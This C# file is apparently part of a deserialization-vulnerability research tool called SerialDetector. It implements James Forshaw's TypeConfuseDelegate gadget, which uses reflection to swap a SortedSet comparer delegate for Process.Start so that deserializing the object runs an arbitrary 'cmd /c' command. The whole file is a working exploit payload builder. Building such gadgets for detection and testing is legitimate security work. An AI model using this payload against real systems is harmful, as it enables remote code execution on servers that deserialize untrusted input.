using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;

namespace SerialDetector.KnowledgeBase.Gadgets
{
    // TypeConfuseDelegate gadget by James Forshaw
    internal class TypeConfuseDelegate : IGadget
    {
        public object Build(string command)
        {
            var singleDelegate = new Comparison<string>(String.Compare);
            var multiDelegate = singleDelegate + singleDelegate;
            var comparer = Comparer<string>.Create(multiDelegate);
            var sortedSet = new SortedSet<string>(comparer)
            {
                "cmd", 
                $"/c {command}"
            };

            var invocationList = multiDelegate.GetInvocationList();
            invocationList[1] = new Func<string, string, Process>(Process.Start);
            var field = typeof(MulticastDelegate).GetField("_invocationList",
                BindingFlags.NonPublic | BindingFlags.Instance);
            field.SetValue(multiDelegate, invocationList);
            
            return sortedSet;
        }
    }
}